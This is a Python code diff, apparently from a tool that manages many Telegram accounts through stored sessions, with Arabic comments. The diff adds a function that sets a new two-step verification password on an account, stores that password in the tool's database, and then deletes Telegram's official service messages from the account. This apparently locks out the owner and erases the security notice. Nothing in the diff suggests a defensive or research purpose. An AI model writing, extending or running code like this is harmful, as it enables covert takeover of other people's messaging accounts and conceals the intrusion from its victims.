@@ -1117,6 +1117,30 @@ async def kick_specific_session(phone: str, session_hash: int) -> bool:
         return False
 
 
+async def set_direct_2fa(phone: str, new_password: str) -> dict:
+    client = await get_active_client(phone)
+    if not client:
+        return {"success": False, "error": "الجلسة معطلة"}
+
+    try:
+        session = await database.get_session_by_phone(phone)
+        current = session["two_fa"] if session and session["two_fa"] else None
+        
+        await client.edit_2fa(
+            current_password=current,
+            new_password=new_password,
+            hint="",
+            email=None,
+        )
+        await database.update_session_two_fa(phone, new_password)
+        await delete_telegram_official_messages(client)
+        await client.disconnect()
+        return {"success": True}
+    except Exception as e:
+        await client.disconnect()
+        return {"success": False, "error": str(e)}
+
+
 # ──────────────────────────────────────────
 # إنعاش جلسة منتهية عبر بريد Login
 # ──────────────────────────────────────────
